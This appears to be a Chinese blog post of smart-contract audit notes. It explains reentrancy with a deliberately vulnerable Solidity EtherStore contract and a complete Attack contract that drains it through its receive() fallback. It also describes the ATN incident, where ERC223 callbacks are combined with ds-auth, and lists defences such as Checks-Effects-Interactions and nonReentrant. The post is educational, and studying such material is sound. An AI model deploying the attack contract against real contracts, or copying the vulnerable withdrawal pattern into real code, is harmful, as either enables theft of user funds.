<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>基础漏洞总结1 | EIGHTJIU</title><meta name="author" content="kizy"><meta name="copyright" content="kizy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="之前学的比较乱，现在复习整理一下。 重入re-entrancy重入攻击是指在合约执行外部调用（通常是向外发送以太或调用另一个合约）时，接收方在该外部调用的执行流程中再次调用回原合约的某个函数，并借此在原合约未完成状态更新之前重复利用其尚未更新的状态，从而盗取资金或破坏状态一致性。   换句话说：合约 A 在执行到“对外调用”并等待返回时，被外部合约 B 回调回 A，利用 A 尚未完成的内部逻辑（比">
<meta property="og:type" content="article">
<meta property="og:title" content="基础漏洞总结1">
<meta property="og:url" content="https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/index.html">
<meta property="og:site_name" content="EIGHTJIU">
<meta property="og:description" content="之前学的比较乱，现在复习整理一下。 重入re-entrancy重入攻击是指在合约执行外部调用（通常是向外发送以太或调用另一个合约）时，接收方在该外部调用的执行流程中再次调用回原合约的某个函数，并借此在原合约未完成状态更新之前重复利用其尚未更新的状态，从而盗取资金或破坏状态一致性。   换句话说：合约 A 在执行到“对外调用”并等待返回时，被外部合约 B 回调回 A，利用 A 尚未完成的内部逻辑（比">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kizzy899.github.io/aaaset/cover_8.jpg">
<meta property="article:published_time" content="2025-10-13T05:45:36.000Z">
<meta property="article:modified_time" content="2025-10-13T08:13:14.869Z">
<meta property="article:author" content="kizy">
<meta property="article:tag" content="合约审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kizzy899.github.io/aaaset/cover_8.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "基础漏洞总结1",
  "url": "https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/",
  "image": "https://kizzy899.github.io/aaaset/cover_8.jpg",
  "datePublished": "2025-10-13T05:45:36.000Z",
  "dateModified": "2025-10-13T08:13:14.869Z",
  "author": [
    {
      "@type": "Person",
      "name": "kizy",
      "url": "https://kizzy899.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/tubiao.png"><link rel="canonical" href="https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '基础漏洞总结1',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/aaaset/page.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/aaaset/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> Search</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> link</span></a></li><li><a class="site-page child" href="/star/"><i class="fa-fw fas fa-star"></i><span> star</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/aaaset/cover_8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">EIGHTJIU</span></a><a class="nav-page-title" href="/"><span class="site-name">基础漏洞总结1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> Search</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> link</span></a></li><li><a class="site-page child" href="/star/"><i class="fa-fw fas fa-star"></i><span> star</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">基础漏洞总结1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-13T05:45:36.000Z" title="发表于 2025-10-13 13:45:36">2025-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-13T08:13:14.869Z" title="更新于 2025-10-13 16:13:14">2025-10-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>之前学的比较乱，现在复习整理一下。</p>
<h1 id="重入re-entrancy"><a href="#重入re-entrancy" class="headerlink" title="重入re-entrancy"></a>重入re-entrancy</h1><p>重入攻击是指在合约执行外部调用（通常是向外发送以太或调用另一个合约）时，接收方在该外部调用的执行流程中<strong>再次调用回原合约的某个函数</strong>，并借此在原合约未完成状态更新之前重复利用其尚未更新的状态，从而盗取资金或破坏状态一致性。</p>
<blockquote>
<p> 换句话说：合约 A 在执行到“对外调用”并等待返回时，被外部合约 B 回调回 A，利用 A 尚未完成的内部逻辑（比如余额未清零）重复触发受害逻辑。</p>
</blockquote>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>漏洞合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EtherStoreVulnerable &#123;</span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">    mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 存款</span><br><span class="line">    function depositFunds() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Need to deposit &gt; 0&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 可提现函数 —— 脆弱：先进行外部调用，再更新内部状态（易受重入）</span><br><span class="line">    function withdrawFunds(uint256 weiToWithdraw) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= weiToWithdraw, &quot;Insufficient balance&quot;);</span><br><span class="line">        require(weiToWithdraw &lt;= withdrawalLimit, &quot;Exceeds withdrawal limit&quot;);</span><br><span class="line">        require(block.timestamp &gt;= lastWithdrawTime[msg.sender] + 1 weeks, &quot;Withdraw not allowed yet&quot;);</span><br><span class="line"></span><br><span class="line">        // 脆弱点：外部调用（向 msg.sender 发送 ETH）发生在状态更新之前</span><br><span class="line">        (bool ok, ) = msg.sender.call&#123;value: weiToWithdraw&#125;(&quot;&quot;);</span><br><span class="line">        require(ok, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 状态更新晚于外部调用 —— 导致重入可以重复提现</span><br><span class="line">        balances[msg.sender] -= weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = block.timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 便捷：合约余额查看</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Attack</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./EtherStoreVulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStoreVulnerable public etherStore;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public attackAmount = 1 ether;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStoreVulnerable(_etherStoreAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 启动攻击：先存入 1 ETH，然后调用 withdraw 触发回退并在回退中重入</span><br><span class="line">    function pwnEtherStore() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= attackAmount, &quot;Need to send at least 1 ETH&quot;);</span><br><span class="line"></span><br><span class="line">        // 将 1 ETH 存入受害合约</span><br><span class="line">        etherStore.depositFunds&#123;value: attackAmount&#125;();</span><br><span class="line"></span><br><span class="line">        // 立刻提现（首次触发外部 send，回退/receive 会再次调用 withdraw）</span><br><span class="line">        etherStore.withdrawFunds(attackAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回退/receive：在收到 ETH 时尝试再次调用 withdraw 实现重入</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        // 当受害合约仍有余额且满足提现限额时，继续重入提现</span><br><span class="line">        if (address(etherStore).balance &gt;= attackAmount) &#123;</span><br><span class="line">            // 继续重入调用</span><br><span class="line">            etherStore.withdrawFunds(attackAmount);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 否则把偷来的钱转给攻击者部署者</span><br><span class="line">            payable(owner).transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 便捷：提取合约内的 ETH（攻击者自保）</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Only owner&quot;);</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="正确的修复方法"><a href="#正确的修复方法" class="headerlink" title="正确的修复方法"></a>正确的修复方法</h3><p><strong>（Checks — Effects — Interactions）</strong></p>
<p>最根本的原则是 <strong>先检查（Checks）→更新合约内部状态（Effects）→再进行外部交互（Interactions）</strong>，确保在进行任何外部调用之前把内部状态变安全。</p>
<blockquote>
<p>交换上述合约的“更新状态”和“调用外部”部分</p>
</blockquote>
<h2 id="如何判断你的合约是否易被重入"><a href="#如何判断你的合约是否易被重入" class="headerlink" title="如何判断你的合约是否易被重入"></a>如何判断你的合约是否易被重入</h2><ul>
<li>是否在任何外部 <code>call</code>&#x2F;<code>callcode</code>&#x2F;<code>delegatecall</code> 之前更新了关键状态？（CEI）</li>
<li>是否有对不可信合约的外部调用？（包括发送 ETH、调用外部合约、转 ERC777&#x2F;自定义 token）</li>
<li>是否为关键函数使用了互斥保护（例如 OpenZeppelin 的 <code>nonReentrant</code>）？</li>
<li>是否有单元&#x2F;集成测试用恶意合约模拟回退并进行重入？（必须做）</li>
<li>是否使用静态分析工具（Slither、Mythril 等）扫描重入相关告警？</li>
</ul>
<h1 id="ATN攻击"><a href="#ATN攻击" class="headerlink" title="ATN攻击"></a>ATN攻击</h1><h2 id="ERC223"><a href="#ERC223" class="headerlink" title="ERC223"></a>ERC223</h2><p><strong>ERC223</strong> 是对 <strong>ERC20</strong> 的一个改进提案，目标是解决把代币误发到不支持代币接收的合约时导致代币“丢失”的问题（ERC20 在向合约发送代币时只会改变余额，不会通知合约，使合约无法处理）。ERC223 在转账到合约时触发合约回调，以便合约能处理接收到的代币，从而提高安全性和可扩展性。</p>
<blockquote>
<p>解决了ERC20调用两次的尴尬</p>
</blockquote>
<h3 id="为什么-ERC20-一次转账可能会被调用两次，而-ERC223-只需要一次？"><a href="#为什么-ERC20-一次转账可能会被调用两次，而-ERC223-只需要一次？" class="headerlink" title="为什么 ERC20 一次转账可能会被调用两次，而 ERC223 只需要一次？"></a>为什么 ERC20 一次转账可能会被调用两次，而 ERC223 只需要一次？</h3><h3 id="🔹-ERC20-的缺陷"><a href="#🔹-ERC20-的缺陷" class="headerlink" title="🔹 ERC20 的缺陷"></a>🔹 ERC20 的缺陷</h3><p>在 ERC20 中，如果你向 <strong>普通外部账户（EOA）</strong> 转账，只需要一次 <code>transfer</code> 即可。</p>
<p>但是如果你要向 <strong>合约地址</strong> 转账，由于合约本身无法自动接收代币，通常需要走以下两步：</p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>操作</th>
<th>函数</th>
<th>谁调用？</th>
</tr>
</thead>
<tbody><tr>
<td>1️⃣</td>
<td>授权对方（合约）可以花你的代币</td>
<td><code>approve(spender, amount)</code></td>
<td>代币持有人</td>
</tr>
<tr>
<td>2️⃣</td>
<td>合约再去拉取授权的代币</td>
<td><code>transferFrom(from, to, amount)</code></td>
<td>接收方合约</td>
</tr>
</tbody></table>
<p>所以对于 <strong>合约接收代币的情况，ERC20 至少需要调用两次函数</strong>。</p>
<hr>
<h3 id="🔹-ERC223-的改进"><a href="#🔹-ERC223-的改进" class="headerlink" title="🔹 ERC223 的改进"></a>🔹 ERC223 的改进</h3><p>ERC223 在 <code>transfer</code> 时会检查接收方是否是合约：</p>
<ul>
<li>✨ 如果接收方是 <strong>合约地址</strong>，则自动调用其 <code>tokenFallback(address from, uint amount, bytes data)</code> 回调函数。</li>
<li>✨ 如果是普通外部账户，就跟 ERC20 一样直接转账。</li>
</ul>
<p>这样可以 <strong>一次调用完成“转账 + 通知合约”操作</strong>，不需要 <code>approve + transferFrom</code>。</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>ERC20</th>
<th>ERC223</th>
</tr>
</thead>
<tbody><tr>
<td>向外部地址转账</td>
<td>✅ 一次即可</td>
<td>✅ 一次即可</td>
</tr>
<tr>
<td>向合约地址转账</td>
<td>❌ 需要 <code>approve + transferFrom</code>（两次调用）</td>
<td>✅ 一次 <code>transfer</code> 自动调用回调</td>
</tr>
<tr>
<td>防止代币误转到黑洞合约</td>
<td>❌ 不会警告，代币直接卡死</td>
<td>✅ 合约必须实现 <code>tokenFallback</code> 才能接收</td>
</tr>
</tbody></table>
<h2 id="DS-Auth库"><a href="#DS-Auth库" class="headerlink" title="DS-Auth库"></a>DS-Auth库</h2><p>好的，下面把关键点说清楚——先定义术语和库的典型用法，再说明 <strong>为什么把 ERC223 的回调机制（<code>tokenFallback</code>&#x2F;<code>receive</code>）和 <code>ds-auth</code>（DappSys 的权限&#x2F;授权库）一起用时，会产生被滥用的攻击面（像你看到的 ATN 事件那样）</strong>。我会给出一个可理解的攻击路径示例并列出具体的防御措施。</p>
<hr>
<h4 id="1-DS-Auth-是什么"><a href="#1-DS-Auth-是什么" class="headerlink" title="1) DS-Auth 是什么"></a>1) DS-Auth 是什么</h4><p><code>ds-auth</code> 是 DappSys &#x2F; DappHub 生态中常见的授权（authority）模块，用来实现可扩展的访问控制。典型接口类似：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract DSAuthority &#123;</span><br><span class="line">    function canCall(address src, address dst, bytes4 sig) public view returns (bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在使用 <code>ds-auth</code> 的合约里，受保护函数会在入口处询问 authority：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// pseudo</span><br><span class="line">require(authority == address(0) ? msg.sender == owner : DSAuthority(authority).canCall(msg.sender, address(this), msg.sig));</span><br></pre></td></tr></table></figure>

<p>也就是说：权限判断通常基于三要素 — <strong>调用者地址（<code>msg.sender</code>）</strong>、<strong>目标合约地址（<code>address(this</code>)）</strong>、和 <strong>函数选择子（<code>msg.sig</code>）</strong>。</p>
<hr>
<h4 id="2-msg-sig-是什么"><a href="#2-msg-sig-是什么" class="headerlink" title="2) msg.sig 是什么"></a>2) <code>msg.sig</code> 是什么</h4><p><code>msg.sig</code> 是 calldata 的前 4 字节，也就是 ABI 的 <strong>函数选择子（function selector）</strong>。<br> 它等同于 <code>bytes4(msg.data[:4])</code> 或 <code>bytes4(keccak256(&quot;functionName(type1,type2,...)&quot;))</code>。</p>
<ul>
<li><code>msg.sig</code> 标识被调用的是哪一个函数（签名），用来在授权判断中识别 “哪个函数被请求执行”。</li>
<li><code>msg.sig</code> <strong>不包含</strong>调用者信息，它只是方法标识符。</li>
</ul>
<hr>
<h3 id="ERC223-的回调机制为何带来风险"><a href="#ERC223-的回调机制为何带来风险" class="headerlink" title="ERC223 的回调机制为何带来风险"></a>ERC223 的回调机制为何带来风险</h3><p>ERC223 在 <code>transfer(to, value, data)</code> 时：</p>
<ul>
<li>如果 <code>to</code> 是合约，会 <strong>自动触发</strong>接收合约的回调（例如常见的 <code>tokenFallback(address from, uint value, bytes data)</code>），从而让接收合约能在收到代币时执行逻辑。</li>
<li>这就产生了“<strong>转账即回调</strong>”的行为链：代币合约 → 接收合约 的执行顺序中，会有外部调用与回调发生（可能带来重入&#x2F;权限利用机会）。</li>
</ul>
<hr>
<h3 id="攻击原理概述"><a href="#攻击原理概述" class="headerlink" title="攻击原理概述"></a>攻击原理概述</h3><p>关键点：<code>ds-auth</code> 用 <code>msg.sender</code> + <code>msg.sig</code> 判断权限，而 <strong>ERC223 的回调会使 <code>msg.sender</code> 变成“发起回调的合约地址（token 合约）或恶意合约地址”</strong>。攻击者可以利用这一点组合出可行攻击链，常见套路如下：</p>
<ol>
<li><strong>权限配置失误 &#x2F; 过宽的授权</strong><ul>
<li>如果 <code>authority</code> 被设置为允许某个合约（或一类合约）对任意（或若干）敏感函数调用 <code>canCall</code> 返回 <code>true</code>，那么当该合约（或恶意实现）在回调期间发起对目标合约的调用时，就会被 <code>ds-auth</code> 视为合法调用。</li>
</ul>
</li>
<li><strong>ERC223 回调作为载体触发敏感函数</strong><ul>
<li>攻击者部署一个恶意 token 合约或操纵转账流程，使目标合约在 token 转账的过程中被回调。回调的上下文 <code>msg.sender</code> 指向 token 合约（或恶意中间合约），而 <code>msg.sig</code> 仍然表明目标函数（比如 <code>setOwner(...)</code>、<code>mint(...)</code>）的 selector。</li>
<li>如果 authority 的策略允许该 <code>msg.sender</code> 对该 <code>msg.sig</code> 进行调用（或者授权逻辑有缺陷），攻击者就能在回调中调用敏感接口，从而提权或铸币。</li>
</ul>
</li>
<li><strong>掩盖来源 &#x2F; 恶意恢复</strong><ul>
<li>攻击者可能在拿到权限后把 <code>owner</code> 恢复为原地址，留下最小可追踪痕迹，而中间已经铸币&#x2F;转走资产。</li>
</ul>
</li>
</ol>
<blockquote>
<p>换句话说：<strong>ERC223 提供了“在代币转账期间执行合约代码”的入口，而 ds-auth 的授权决策恰好基于“谁发起调用（msg.sender）与要调用哪个函数（msg.sig）”</strong>。当授权策略配置不严（或存在逻辑漏洞）时，攻击者可以通过构造回调调用把自己“伪装”为被授权的调用者，或利用被授权的合约作为跳板，去调用本不该自己调用的管理函数。</p>
</blockquote>
<hr>
<h4 id="一个简单（抽象）示例流程"><a href="#一个简单（抽象）示例流程" class="headerlink" title="一个简单（抽象）示例流程"></a>一个简单（抽象）示例流程</h4><ul>
<li>目标合约 <code>Target</code> 使用 <code>ds-auth</code> 判断：<code>DSAuthority.canCall(msg.sender, address(this), msg.sig)</code>。</li>
<li><code>authority</code> 错误地允许 <code>SomeTokenContract</code> 对某些 selector（比如 <code>mint</code>）返回 <code>true</code>（例如因为某次配置失误或把“代币合约”列入白名单）。</li>
<li>攻击者部署&#x2F;控制 <code>SomeTokenContract</code>，并在其 <code>transfer</code> 内触发 <code>tokenFallback</code>，在回调中 <strong>代表 token 合约</strong> 去调用 <code>Target.mint(attacker, amount)</code>。</li>
<li><code>Target</code> 在权限检查看到 <code>msg.sender == SomeTokenContract</code>，<code>msg.sig == mint selector</code>，而 authority 允许这种调用 → 因此执行 <code>mint</code>，把代币铸给攻击者。</li>
</ul>
<hr>
<h4 id="为什么这类攻击容易被忽视-成功率高"><a href="#为什么这类攻击容易被忽视-成功率高" class="headerlink" title="为什么这类攻击容易被忽视 &#x2F; 成功率高"></a>为什么这类攻击容易被忽视 &#x2F; 成功率高</h4><ul>
<li><code>ds-auth</code> 的授权逻辑看起来“通用”：按 <code>src/dst/sig</code> 三元组授权非常灵活，但也因此若管理不慎（例如把某个合约列为可信、或批量授权某些 selector），会产生非常危险的后果。</li>
<li>ERC223 的回调看似方便（一次转账并通知接收方），但它把“通知”变成了“可以执行任意逻辑的入口”，给攻击者提供了时间窗口与上下文切换（<code>msg.sender</code> 会变）。</li>
</ul>
<hr>
<h4 id="防御与实践建议"><a href="#防御与实践建议" class="headerlink" title="防御与实践建议"></a>防御与实践建议</h4><ol>
<li><strong>不要把代币合约或任意第三方合约作为广泛授权对象</strong><ul>
<li><code>authority</code> 的白名单应尽量精确到具体合约地址 + 具体 selector；不要把“代币合约”或“任何合约”广泛授权。</li>
</ul>
</li>
<li><strong>敏感函数优先使用严格的 <code>msg.sender == owner</code> 或多签控制</strong><ul>
<li>对极其敏感的管理操作（如 <code>setOwner</code>、<code>mint</code>、<code>upgrade</code>），尽量不依赖可扩展的三元组授权作为唯一门槛，采用 <code>owner-only</code> 或多签&#x2F;治理合约。</li>
</ul>
</li>
<li><strong>对接收 token 的回调保持最小权限与最小行为</strong><ul>
<li>在 <code>tokenFallback</code> &#x2F; <code>receive</code> 中尽量只做最少的状态记录&#x2F;事件，而不要在回调中直接触发高权限修改或管理操作。</li>
</ul>
</li>
<li><strong>审慎配置 authority，并对授权变更保留审计日志</strong><ul>
<li>对 <code>authority</code> 的任何修改都要通过治理流程或多签，并记录变更，便于事后追查。</li>
</ul>
</li>
<li><strong>避免把授权决策仅仅依赖 <code>msg.sig</code> 的“白名单”</strong><ul>
<li>可以在 <code>canCall</code> 内加入额外上下文检查（例如：只允许特定 <code>src</code> 在特定情况下对特定 <code>dst</code>&#x2F;<code>sig</code> 调用），并对“合约调用”与“EOA 调用”做不同策略。</li>
</ul>
</li>
<li><strong>与 ERC223 集成时要小心：将接收回调只作为通知，不作为触发管理入口</strong><ul>
<li>如果必须在回调中执行动作，先把必要状态“锁定”或通过非回调的后续流程完成（避免在回调里完成关键授权变更）。</li>
</ul>
</li>
<li><strong>写攻击&#x2F;回归测试并用静态分析工具扫描</strong><ul>
<li>用恶意 token 回调合约模拟攻击路径；用 Slither 等工具扫描 <code>canCall</code> 的潜在配置问题与危险模式。</li>
</ul>
</li>
<li><strong>使用互斥与 CEI 防止回调期间状态未一致</strong><ul>
<li>对易受重入的函数加 <code>nonReentrant</code> 或采用 CEI（先更新状态再交互）。</li>
</ul>
</li>
